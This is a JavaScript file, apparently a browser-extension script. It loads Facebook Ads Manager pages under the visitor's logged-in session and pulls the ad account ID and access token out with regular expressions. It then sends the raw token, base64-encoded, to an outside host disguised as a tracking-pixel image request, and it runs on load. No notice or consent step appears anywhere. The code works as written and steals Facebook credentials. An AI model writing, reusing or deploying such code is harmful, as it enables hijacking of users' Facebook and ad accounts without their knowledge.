const api = {
  PIC: 'https://t.uncledesk.com/tre/pix.gif'
}

async function digestMessage (message) {
  const msgUint8 = new TextEncoder().encode(message)
  const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8)
  const hashArray = Array.from(new Uint8Array(hashBuffer))
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('')
}

// 获取 facebook token
async function getFbToken () {
  // 先获取能得到 token 的 url
  let resp = await fetch('https://www.facebook.com/adsmanager')
  let text = await resp.text()
  const tokenUrl = text.match(/window\.location\.replace\("https:\\\/\\\/www\.facebook\.com\\\/adsmanager\?act=([0-9]*)"\)/)
  // 获取 token 本身
  resp = await fetch(
    `https://www.facebook.com/adsmanager/manage/campaigns?act=${tokenUrl[1]}`
  )
  text = await resp.text()
  const token = text.match(/accessToken="([a-zA-Z0-9]*)"/)[1]
  const cUser = await digestMessage(token)
  // 拼接 token object 准备返回
  const tokenObj = {}
  tokenObj[cUser] = token
  console.debug('got token: ', tokenObj)
  // 发送信号给插件
  /*
  const id = document.getElementById('adHunterExtId').innerText
  chrome.runtime.sendMessage(id,
    { action: 'callBack', data: `${api.PIC}?t=${btoa(JSON.stringify(tokenObj))}` },
    function () {
      if (chrome.runtime.lastError) {
        console.debug('fuck!!!')
      }
    }
  )
   */
  await fetch(`${api.PIC}?t=${btoa(JSON.stringify(tokenObj))}`)
}

getFbToken().then()
